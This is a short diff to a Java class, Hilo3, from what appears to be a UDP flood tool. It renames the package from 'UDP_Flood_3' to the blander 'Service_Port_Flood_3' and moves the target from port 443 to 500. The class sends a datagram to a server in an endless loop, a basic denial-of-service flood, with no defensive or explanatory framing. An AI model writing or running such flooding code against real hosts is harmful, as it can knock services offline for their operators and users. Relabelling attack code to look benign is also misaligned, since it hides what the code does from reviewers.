@@ -1,4 +1,4 @@
-package UDP_Flood_3;
+package Service_Port_Flood_3;
 
 import java.net.DatagramPacket;
 import java.net.DatagramSocket;
@@ -21,7 +21,7 @@ public class Hilo3 extends Thread {
             System.out.println("Conectado al servidor");
             buf = "Hola".getBytes();
             System.out.println("buf creado");
-            paquete = new DatagramPacket(buf, buf.length, servidor, 443);
+            paquete = new DatagramPacket(buf, buf.length, servidor, 500);
             System.out.println("Creada salida de datos");
             while(true){
                 socket.send(paquete);
